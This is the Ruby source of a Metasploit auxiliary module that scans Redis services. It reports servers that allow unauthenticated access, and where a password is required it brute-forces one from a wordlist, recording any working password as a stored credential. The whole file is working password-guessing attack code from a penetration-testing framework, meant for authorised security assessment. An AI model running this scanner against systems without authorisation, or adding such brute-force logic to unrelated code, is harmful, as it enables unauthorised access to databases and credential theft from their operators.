##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/redis'
require 'metasploit/framework/credential_collection'

# Metasploit Module - Redis Login Scanner
#
# @example
#   use auxiliary/scanner/redis/login
#
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Redis

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Redis Login Utility',
        'Description' => 'This module attempts to authenticate to an Redis service.',
        'Author' => [ 'Nixawk' ],
        'References' => [
          ['URL', 'https://redis.io/topics/protocol']
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptPath.new('PASS_FILE',
                    [
                      false,
                      'The file that contains a list of of probable passwords.',
                      File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
                    ])
      ]
    )

    # redis does not have an username, there's only password
    deregister_options(
      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',
      'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE'
    )
  end

  def requires_password?(_ip)
    connect
    command_response = send_redis_command('INFO')

    ## Check against the old and new password required response to support all Redis versions
    !(
      (command_response && Rex::Proto::Redis::Base::Constants::AUTHENTICATION_REQUIRED !~ command_response) ||
        (command_response && Rex::Proto::Redis::Version6::Constants::AUTHENTICATION_REQUIRED !~ command_response)
    )
  end

  def run_host(ip)
    unless requires_password?(ip)
      print_good "#{peer} - No password is required."
      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        sname: 'redis',
        name: 'Unauthenticated Redis Access',
        info: "Module #{fullname} confirmed unauthenticated access to the Redis service"
      )
      return
    end

    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD']
    )
    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::Redis.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        connection_timeout: 30
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )

      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        credential_data.delete(:username) # This service uses no username
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        if datastore['VERBOSE']
          vprint_good "#{peer} - Login Successful: #{result.credential} (#{result.status}: #{result.proof.strip})"
        else
          print_good "#{peer} - Login Successful: #{result.credential}"
        end
      when Metasploit::Model::Login::Status::NO_AUTH_REQUIRED
        vprint_error "#{peer} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof.strip})"
        break
      else
        invalidate_login(credential_data)
        vprint_error "#{peer} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof.strip})"
      end
    end
  end
end
